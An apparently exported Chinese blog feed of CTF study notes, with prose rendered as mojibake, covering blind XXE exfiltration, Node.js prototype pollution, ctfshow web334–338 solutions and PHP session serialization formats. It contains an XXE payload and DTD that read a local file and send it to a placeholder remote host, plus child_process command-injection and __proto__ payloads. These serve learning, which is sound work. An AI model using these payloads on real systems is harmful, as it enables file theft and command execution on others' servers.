<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ã€€<strong>test.dtd</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>

<p>ã€€<strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>ã€€æˆ‘ä»¬ä» payload ä¸­èƒ½çœ‹åˆ° è¿ç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®ä½“ %remote;%int;%send;ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é¡ºåºï¼Œ%remote å…ˆè°ƒç”¨ï¼Œè°ƒç”¨åè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ test.dtd ï¼Œæœ‰ç‚¹ç±»ä¼¼äºå°† test.dtd åŒ…å«è¿›æ¥ï¼Œç„¶å %int è°ƒç”¨ test.dtd ä¸­çš„ %file, %file å°±ä¼šå»è·å–æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† %file çš„ç»“æœå¡«å…¥åˆ° %send ä»¥å(å› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  <code>%</code>)ï¼Œæˆ‘ä»¬å†è°ƒç”¨ %send; æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹ vps ä¸Šï¼Œè¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œå®Œç¾çš„è§£å†³äº† XXE æ— å›æ˜¾çš„é—®é¢˜ã€‚</p>
<p>è¿™é‡Œç”±äºæ²¡æœ‰æ‰¾åˆ°ä¾‹é¢˜ï¼Œç›´æ¥æŠ„åˆå¤©çš„äº†</p>
<p>æ–°å­¦çš„linuxå‘½ä»¤</p>
<p>grep -i â€œGETâ€ xxx.log</p>
<p>è¿™é‡Œåœ¨æ—¥å¿—æ–‡ä»¶æŸ¥çœ‹å¤–å¸¦æ•°æ®ï¼Œç”±äºæˆ‘ä»¬æ˜¯GETä¼ å‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥å…³é”®å­—GETè¿‡æ»¤å¯ä»¥çœ‹å¾—å¿«ä¸€ç‚¹</p>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>xxeåœ¨æˆ‘æœé›†èµ„æ–™çš„æ—¶å€™èƒ½åšçš„è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å†…ç½‘æ¢æµ‹ï¼Œå‘½ä»¤æ‰§è¡Œâ€¦â€¦ä¹‹åæœ‰æ—¶é—´å†å›æ¥å­¦</p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>å…¥é—¨</tag>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>node.jsåŸå‹é“¾æ±¡æŸ“</title>
    <url>/2024/03/11/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="å¥½ä¸œè¥¿"><a href="#å¥½ä¸œè¥¿" class="headerlink" title="å¥½ä¸œè¥¿"></a>å¥½ä¸œè¥¿</h1><span id="more"></span>

<h1 id="åŸºæœ¬ä»‹ç»"><a href="#åŸºæœ¬ä»‹ç»" class="headerlink" title="åŸºæœ¬ä»‹ç»"></a>åŸºæœ¬ä»‹ç»</h1><p>åŸå‹é“¾æ±¡æŸ“å…¶å®å°±æ˜¯å›´ç»•ç€ä¸¤ä¸ªå±æ€§åšæ–‡ç« </p>
<p>å±æ€§<code>__proto__</code></p>
<p>å±æ€§<code>prototype</code></p>
<h2 id="ä»ç”¨æ³•è§’åº¦ä»‹ç»"><a href="#ä»ç”¨æ³•è§’åº¦ä»‹ç»" class="headerlink" title="ä»ç”¨æ³•è§’åº¦ä»‹ç»"></a>ä»ç”¨æ³•è§’åº¦ä»‹ç»</h2><p>è¯•æƒ³ä¸€äº›é€šç”¨çš„æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦‚ä½•è°ƒç”¨çš„å‘¢ï¼Œå¦‚<code>toString()</code></p>
<p>æˆ‘ä»¬åœ¨nodejså‘½ä»¤æ‰§è¡Œä¸­å†™è¿‡ä¸€ä¸ª</p>
<p>payload:eval&#x3D;require(â€˜child_processâ€™).spawnSync(â€˜tacâ€™,[â€˜fl001g.txtâ€™]).stdout.toString()</p>
<p>é‚£æ—¶æˆ‘ä¸Šå®˜ç½‘æ–‡æ¡£é‡ŒæŸ¥çœ‹äº†ä¸€ä¸‹child_processç±»ä¸­å¹¶æ²¡æœ‰toString()æ–¹æ³•</p>
<p>é‚£å®ƒå“ªæ¥çš„å‘¢ï¼Ÿ</p>
<h2 id="proto-å’Œprototype"><a href="#proto-å’Œprototype" class="headerlink" title="__proto__å’Œprototype"></a><code>__proto__</code>å’Œprototype</h2><p>é¦–å…ˆè¿™ä¸¤éƒ½æ˜¯å±æ€§ï¼Œéƒ½æ˜¯é»˜è®¤å†…ç½®åœ¨æ¯ä¸ªå¯¹è±¡å½“ä¸­</p>
<p>prototypeæŒ‡å‘ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å¾ˆåŸºç¡€ï¼ŒåŒ…å«äº†å¾ˆå¤šé€šç”¨çš„æ–¹æ³•å’Œå±æ€§ï¼Œæ¯”å¦‚åˆšåˆšçš„<code>toString()</code></p>
<p><code>__proto__</code>åˆ™æŒ‡å‘object.prototypeï¼Œå®é™…ä¸Šä¹Ÿæ˜¯æŒ‡å‘åŸå‹å¯¹è±¡</p>
<p>é—®é¢˜è¿˜æ²¡è§£ç­”ï¼Œé‚£toString()æ€ä¹ˆç”¨çš„å‘¢?</p>
<p>è¿™å°±è¦è¯´ä¸€ä¸‹prototypeçš„ä¸€äº›æœºåˆ¶ï¼Œå½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­çš„å±æ€§å’Œæ–¹æ³•æ—¶ï¼Œå…ˆæ˜¯åœ¨å¯¹è±¡ä¸­å¯»æ‰¾ï¼Œè‹¥æœ‰åˆ™ç”¨ï¼Œè‹¥æ— åˆ™å»prototypeæŒ‡å‘çš„åŸå‹çš„å¯¹è±¡ä¸­å»æ‰¾.</p>
<p>ä»¥ä¸‹ä¸ºå®éªŒ</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164432778.png"  alt="image-20240311164432778"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164445047.png"  alt="image-20240311164445047"></p>
<p>å¯è§bå¯¹è±¡è™½ä¸ºç©ºï¼Œä½†è¿˜æ˜¯è¾“å‡ºäº†goä¸­çš„2</p>
<p>åˆ°è¿™é‡Œç†è®ºå·²ç»å½¢æˆï¼Œä¸‹é¢çœ‹çœ‹å®æˆ˜</p>
<h1 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h1><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>é¢˜ç›®ç»™äº†æºç ï¼Œå¿«è¿›åˆ°è·¯ç”±ä¸­çš„login.js</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311165617963.png"  alt="image-20240311165617963"></p>
<p>è¦æ±‚:è®©secert(ä½œè€…æ˜¯æ•…æ„è¿˜æ˜¯ä¸å°å¿ƒæ‰“é”™çš„)ä¸­çš„ctfshowç­‰äº36dboyå³å¯è¾“å‡ºflag</p>
<p>å¾ˆå®¹æ˜“å°±æƒ³åˆ°äº†åŸå‹é“¾æ±¡æŸ“ï¼Œåœ¨åŸå‹å¯¹è±¡ä¸­æ³¨å…¥ä¸€ä¸ªctfshow:36dboyå³å¯</p>
<p>é‚£æ³¨å…¥ç‚¹åœ¨å“ªï¼Ÿ</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170233201.png"  alt="image-20240311170233201"></p>
<p>è¿™é‡Œæäº†ä¸ªä»€ä¹ˆå¤„ç†ï¼Œæ‰“å¼€utilsä¸­çš„common.jsåº·åº·</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170337591.png"  alt="image-20240311170337591"></p>
<p>çœŸæ˜¯ç‚¸ç‚¸åˆåˆšåˆšå•Šï¼Œç®€å•ä»‹ç»ä¸€ä¸‹å°±æ˜¯æŠŠæˆ‘ä»¬å†™å…¥çš„æ•°æ®copyåˆ°äº†userå¯¹è±¡ä¸­</p>
<p>è¯¦ç»†è§£é‡Š:</p>
<p>1.ä¼ å…¥ä¸¤ä¸ªå¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯user,ä¸€ä¸ªæ˜¯req.body,req.bodyç”±æˆ‘ä»¬æ‰€æ§</p>
<p>2.å®šä¹‰ä¸€ä¸ªkeyä¸æ–­è¯»å–req.bodyä¸­çš„é”®å</p>
<p>3.å¦‚æœè¿™ä¸ªé”®ååœ¨userä¸­å­˜åœ¨ï¼Œåˆ™ç»§ç»­è°ƒç”¨copyï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åœ¨åˆ™è®©useråˆ›å»ºä¸€ä¸ªå’ŒkeyåŒåçš„é”®åï¼Œå¹¶ä¸”å­˜å‚¨å’Œreq.bodyä¸­ç›¸åŒçš„é”®å€¼</p>
<p>4.keyè¯»å®Œäº†è‡ªåŠ¨å°±è·³å‡ºå¾ªç¯äº†</p>
<p>æŠ“ä¸ªåŒ…çœ‹çœ‹å®ƒå’‹å†™</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311171328658.png"  alt="image-20240311171328658"></p>
<p><code>payload:&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172433837.png"  alt="image-20240311172433837"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172445135.png"  alt="image-20240311172445135"></p>
<p>å¸¦å‡ºæ¥äº†</p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs-ctfshow</title>
    <url>/2024/03/02/nodejs-ctfshow/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p>ç»™äº†ä¸¤ä¸ªæºç æ–‡ä»¶å’Œä¸€ä¸ªç™»å½•ç•Œé¢</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303111933863.png"  alt="image-20240303111933863"></p>
<p>å‰ç«¯å¯ä»¥çœ‹åˆ°çš„ï¼Œä»¥postæ•°æ®æäº¤ç”¨æˆ·åå’Œå¯†ç ï¼Œä»¥jsonæ ¼å¼æ¥å—è¿”å›æ•°æ®</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112015481.png"  alt="image-20240303112015481"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112028812.png"  alt="image-20240303112028812"></p>
<p>è¿™é‡Œç»™äº†ç”¨æˆ·åå’Œå¯†ç ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹ç™»å½•æ£€éªŒ</p>
<p>ç”¨æˆ·åä¸èƒ½ä¸ºCTFSHOWï¼Œè¾“å…¥çš„ç”¨æˆ·åä¼šç»è¿‡<code>toUpperCase()</code>è½¬åŒ–ä¸ºå¤§å†™åä¸æ•°æ®æ¯”è¾ƒï¼Œå¯†ç æ­£å¸¸æ¯”è¾ƒã€‚</p>
<p>æ—¢ç„¶ä¼šè½¬åŒ–ä¸ºå¤§å†™ï¼Œç›´æ¥è¾“å…¥ctfshow(å°å†™)å³å¯</p>
<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p>é¢˜é¢</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124252606.png"  alt="image-20240303124252606"></p>
<p>ä¿¡æ¯æ”¶é›†</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124304897.png"  alt="image-20240303124304897"></p>
<p>æŠ“åŒ…æ‰«æåæ— æœ</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124335586.png"  alt="image-20240303124335586"></p>
<p>ä¼ å…¥eval&#x3D;1ï¼Œå‡ºç°å›æ˜¾ï¼Œæ¨æµ‹ä¸ºconsole.log(ä¼ å‚)ï¼Œåæ­£èƒ½æ‰§è¡Œæˆ‘çš„å‘½ä»¤å¹¶ä¸”è¾“å‡º</p>
<p>åœ¨nodejsä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ‘ä»¬ä¸»è¦æ˜¯ä½¿ç”¨child_processç±»</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240304175348635.png"  alt="image-20240304175348635"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰å¾ˆå¤šæ–¹æ³•ï¼Œæœ‰åŒæ­¥å’Œå¼‚æ­¥åˆ›å»ºè¿›ç¨‹çš„åˆ†ç±»ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦çš„æ˜¯å¼‚æ­¥åˆ›å»ºè¿›ç¨‹ï¼Œè¿™é‡Œè¿˜ä¸æ˜¯å¾ˆç†è§£ä¸ºä»€ä¹ˆåŒæ­¥åˆ›å»ºè¿›ç¨‹ä¸ä¼šæœ‰å›æ˜¾(å¤§æ¦‚æ˜¯å› ä¸ºä¸»ç¨‹åºæ²¡ç»“æŸï¼Œå­è¿›ç¨‹æ²¡æœ‰æ‰§è¡Œï¼Ÿ)</p>
<p>å…ˆçœ‹<code>execSync()</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180214603.png"  alt="image-20240304180214603"></p>
<p>å®˜æ–¹æ–‡æ¡£çœ‹å¾—ä¸æ˜¯å¾ˆæ‡‚ï¼Œå¸Œæœ›ä»¥åæœ‰æœºä¼šç ”è¯»</p>
<p>æ€»ä¹‹åº”å¯¹è¿™é¢˜ï¼Œåªéœ€è¦ä¸€ä¸ªå‚æ•°commandè¶³ä»¥</p>
<p>payload:eval&#x3D;require(â€˜child_processâ€™).execSync(â€˜lsâ€™)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180415820.png"  alt="image-20240304180415820"></p>
<p>å‘ç°flagæ–‡ä»¶ï¼Œæ”¹å‘½ä»¤æŸ¥çœ‹å³å¯</p>
<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>è¿™é¢˜ç›¸æ¯”ä¸Šé¢˜ï¼Œbanæ‰äº†execï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨å¦ä¸€ä¸ªspawn</p>
<h2 id="ç¬¬ä¸€ç§æ–¹æ³•spwanSync"><a href="#ç¬¬ä¸€ç§æ–¹æ³•spwanSync" class="headerlink" title="ç¬¬ä¸€ç§æ–¹æ³•spwanSync()"></a>ç¬¬ä¸€ç§æ–¹æ³•spwanSync()</h2><p>payload1:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</code></p>
<p>payload2:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305181344645.png"  alt="image-20240305181344645"></p>
<p>å­¦ä¹ ä¸€ä¸‹<code>spawnSync()</code>æ–¹æ³•</p>
<p><code>spawnSync()</code>ä¼šåŒæ­¥åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„å‘½ä»¤ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªå¯¹è±¡.</p>
<h3 id="ä¼ å…¥å‘½ä»¤"><a href="#ä¼ å…¥å‘½ä»¤" class="headerlink" title="ä¼ å…¥å‘½ä»¤"></a>ä¼ å…¥å‘½ä»¤</h3><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‘½ä»¤çš„åç§°</p>
<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç”¨æ¥ä¼ é€’å‘½ä»¤çš„å‚æ•°</p>
<h3 id="è¿”å›çš„å¯¹è±¡"><a href="#è¿”å›çš„å¯¹è±¡" class="headerlink" title="è¿”å›çš„å¯¹è±¡"></a>è¿”å›çš„å¯¹è±¡</h3><p>è¿”å›çš„è¿™ä¸ªå¯¹è±¡åŒ…å«å‘½ä»¤æ‰§è¡Œåçš„ä¿¡æ¯</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305182634001.png"  alt="image-20240305182634001"></p>
<p>è¿™é‡Œæˆ‘ä»¬éœ€è¦çš„æ˜¯æ ‡å‡†è¾“å‡ºæµstdoutï¼Œå¹¶ç”¨toString()å°†å®ƒè½¬åŒ–ä¸ºå­—ç¬¦ä¸²å³å¯è¾“å‡º</p>
<h2 id="ç¬¬äºŒç§æ–¹æ³•-fsç±»"><a href="#ç¬¬äºŒç§æ–¹æ³•-fsç±»" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³• fsç±»"></a>ç¬¬äºŒç§æ–¹æ³• fsç±»</h2><h3 id="ä¸¤ä¸ªé­”æœ¯å˜é‡"><a href="#ä¸¤ä¸ªé­”æœ¯å˜é‡" class="headerlink" title="ä¸¤ä¸ªé­”æœ¯å˜é‡"></a>ä¸¤ä¸ªé­”æœ¯å˜é‡</h3><p>__filename:è¿”å›å½“å‰æ¨¡å—æ–‡ä»¶è¢«è§£æè¿‡åçš„ç»å¯¹è·¯å¾„</p>
<p>__dirname:è¿”å›å½“å‰æ¨¡å—æ–‡ä»¶è§£æåæ‰€åœ¨çš„æ–‡ä»¶å¤¹çš„ç»å¯¹è·¯å¾„</p>
<h3 id="readdirSyncå’ŒreadFileSync"><a href="#readdirSyncå’ŒreadFileSync" class="headerlink" title="readdirSyncå’ŒreadFileSync"></a>readdirSyncå’ŒreadFileSync</h3><p>payload1:<code>eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)</code>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p>payload2:<code>eval=require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;,&#39;utf-8&#39;)</code>æŸ¥çœ‹æ–‡ä»¶</p>
<h3 id="execç»•è¿‡"><a href="#execç»•è¿‡" class="headerlink" title="execç»•è¿‡"></a>execç»•è¿‡</h3><p>payload:?<code>eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></p>
<p>è¿™é‡Œæœ‰ä¸ªç–‘ç‚¹ï¼Œå¦‚æœæˆ‘æƒ³è¯»å–ä¸Šä¸€å±‚ç›®å½•çš„æ–‡ä»¶è¯¥å¦‚ä½•å¤„ç†,ä»¥åå†æƒ³å§</p>
<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240305201256890.png"  alt="image-20240305201256890"></p>
<p>è¦æ±‚ï¼Œä¼ å…¥ä¸¤ä¸ªæ•°ab</p>
<p>1.açš„é•¿åº¦å’Œbçš„é•¿åº¦ä¸€è‡´</p>
<p>2.aä¸ç­‰äºb</p>
<p>3.md5ç¼–ç åçš„a+flagå’Œb+flagç›¸ç­‰</p>
<h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>è¿™é‡Œæˆ‘ä»¬çš„payloadä¸ºa[]&#x3D;1&amp;b[]&#x3D;1</p>
<p>1.æ•°ç»„.lengthå³æ•°ç»„å…ƒç´ ä¸ªæ•°ï¼Œæ»¡è¶³ç›¸ç­‰</p>
<p>2.JavaScriptä¼šæ¯”è¾ƒç­‰å·ä¸¤è¾¹æ•°ç»„çš„åœ°å€ï¼Œå¼±ä¸ä¸€æ ·ç›´æ¥è¿”å›false(ä½†æ˜¯phpä¸ä¼š)</p>
<p>3.ä¸Šæœ¬åœ°æµ‹è¯•å›¾</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202533805.png"  alt="image-20240305202533805"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202543607.png"  alt="image-20240305202543607"></p>
<p>okäº†</p>
<p>å†çœ‹çœ‹å¦‚æœæ•°ç»„é‡Œé¢æœ‰ä¸¤ä¸ªå…ƒç´ å‘¢</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202622579.png"  alt="image-20240305202622579"></p>
<h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>payload:a[â€˜xâ€™]&#x3D;1&amp;b[â€˜xâ€™]&#x3D;1</p>
<p>åŸç†ä¸ä¸Šå·®ä¸å¤šç›¸åŒï¼Œä¸è¿‡è¾“å‡ºçš„ä¸œè¥¿ä¸å¤ªåŒ</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305203029034.png"  alt="image-20240305203029034"></p>
<h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>åŸå‹é“¾æ±¡æŸ“</p>
<p>ç§»æ­¥ä¸‹ä¸€ç¯‡æ–‡ç« </p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å…¥é—¨</tag>
        <tag>å­¦ä¹ </tag>
        <tag>ctfshow</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>php_Sessionååºåˆ—åŒ–å­¦ä¹ </title>
    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="phpååºåˆ—åŒ–çš„ä¸€ç§"><a href="#phpååºåˆ—åŒ–çš„ä¸€ç§" class="headerlink" title="phpååºåˆ—åŒ–çš„ä¸€ç§"></a>phpååºåˆ—åŒ–çš„ä¸€ç§</h1><span id="more"></span>

<h1 id="ä»å¼€å‘è€…è§’åº¦è®¤è¯†session"><a href="#ä»å¼€å‘è€…è§’åº¦è®¤è¯†session" class="headerlink" title="ä»å¼€å‘è€…è§’åº¦è®¤è¯†session"></a>ä»å¼€å‘è€…è§’åº¦è®¤è¯†session</h1><h2 id="ä¸ºä»€ä¹ˆéœ€è¦session"><a href="#ä¸ºä»€ä¹ˆéœ€è¦session" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦session"></a>ä¸ºä»€ä¹ˆéœ€è¦session</h2><p>ç”±äºhttpåè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ç§åŸºäºhttpçš„æŠ€æœ¯è®©æœåŠ¡å™¨è¯†åˆ«ç”¨æˆ·çš„çŠ¶æ€ï¼Œä»¥è¾¾åˆ°é˜²æŠ¤ï¼Œæä¾›ç”¨æˆ·ä¸ªæ€§åŒ–èµ„æºï¼Œè®°å½•ç”¨æˆ·æ“ä½œç­‰ç›®çš„</p>
<h1 id="sessionä¸€äº›ç‰¹æ€§"><a href="#sessionä¸€äº›ç‰¹æ€§" class="headerlink" title="sessionä¸€äº›ç‰¹æ€§"></a>sessionä¸€äº›ç‰¹æ€§</h1><p>ç›¸æ¯”äºcookieï¼Œsessionä¸»è¦ç”±sessionidå’Œå®ƒæ‰€å¸¦çš„å€¼ç»„æˆï¼Œè€Œsessionå­˜å‚¨åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¸¤ç«¯ï¼Œå®¢æˆ·ç«¯åªå­˜å‚¨sessionidï¼ŒæœåŠ¡ç«¯ä¸¤ä¸ªéƒ½å­˜ã€‚</p>
<h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><p>å¦‚æœæˆ‘æƒ³é€šè¿‡sessionå®ç°ä¸€ä¸ªåŠŸèƒ½â€”â€”å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºâ€ä½ å¥½!xxxâ€</p>
<p>ç®€å•å†™ä¸ªå‰åç«¯</p>
<p>æ³¨å†Œ</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
<p>å¡«å…¥åå¯ä»¥çœ‹åˆ°åœ¨temç›®å½•ä¸‹çš„sessionæ–‡ä»¶</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
<p>ç™»å½•</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
<p>æˆ‘ä»¬å°±å®ç°äº†è¿™ä¸ªåŠŸèƒ½</p>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p>å‰é¢æåˆ°ç”¨æˆ·çš„è¾“å…¥ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨åœ¨sessionä¸­ï¼Œphpç»™æˆ‘ä»¬æä¾›äº†ä¸‰ç§å¤„ç†å¼•æ“ï¼Œç”±<code>session.serialize_handler</code>æ¥è®¾ç½®</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>å­˜å‚¨æ ¼å¼:é”®å+ç«–çº¿+ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
<p>è¿™é‡Œç«–çº¿å‰é¢çš„useræ˜¯<code>$_SESSION[&#39;user&#39;]</code>é‡Œçš„userï¼Œç«–çº¿åé¢çš„useræ˜¯ç±»å</p>
<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p>
<p>å¯¹æ¯”ä¸Šé¢çš„phpå…¶å®ä¹Ÿå°±å¤šä¸ªASCIIå­—ç¬¦,å°‘ä¸ªç«–çº¿</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
<p>ä¸ºäº†æ›´ç›´è§‚ï¼Œæˆ‘æŠŠé”®åå†™åˆ°33ä¸ªå­—ç¬¦ï¼Œ33å¯¹åº”çš„ASCIIå­—ç¬¦ä¸º!</p>
<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„__æ•°ç»„__</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
<p>aè¡¨ç¤ºçš„æ˜¯SESSIONæ•°ç»„ä¸­æœ‰å‡ ä¸ªå…ƒç´ ï¼ŒèŠ±æ‹¬å·é‡ŒåŒ…æ‹¬åºåˆ—åŒ–åçš„æ•°æ®ï¼Œè¿™é‡Œçš„é”®åä¹Ÿéœ€è¦<code>s::;</code>çš„è¡¨è¾¾</p>
